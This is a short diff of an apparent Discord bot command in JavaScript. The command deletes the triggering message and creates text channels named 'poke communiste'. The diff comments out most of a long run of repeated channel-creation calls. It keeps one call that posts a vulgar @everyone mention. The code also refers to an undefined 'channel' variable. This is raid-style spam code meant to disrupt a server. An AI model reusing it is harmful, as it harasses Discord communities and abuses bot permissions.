@@ -1,5 +1,7 @@
 module.exports.run = async(bot, message) => {  
 message.delete()
+message.guild.createChannel(`poke communiste`, "text").then(message.channel.send(`@everyone fucked by des poke communiste`));
+/*message.guild.createChannel(`poke communiste`, "text")
 message.guild.createChannel(`poke communiste`, "text")
 message.guild.createChannel(`poke communiste`, "text")
 message.guild.createChannel(`poke communiste`, "text")
@@ -25,9 +27,7 @@ message.guild.createChannel(`poke communiste`, "text")
 message.guild.createChannel(`poke communiste`, "text")
 message.guild.createChannel(`poke communiste`, "text")
 message.guild.createChannel(`poke communiste`, "text")
-message.guild.createChannel(`poke communiste`, "text")
-message.guild.createChannel(`poke communiste`, "text")
-
+*/
 message.channel.send(`Votre channel à était crée<#${channel.id}>`)
 channel.overwritePermissions(message.guild.id, {
       "READ_MESSAGE_HISTORY": true,
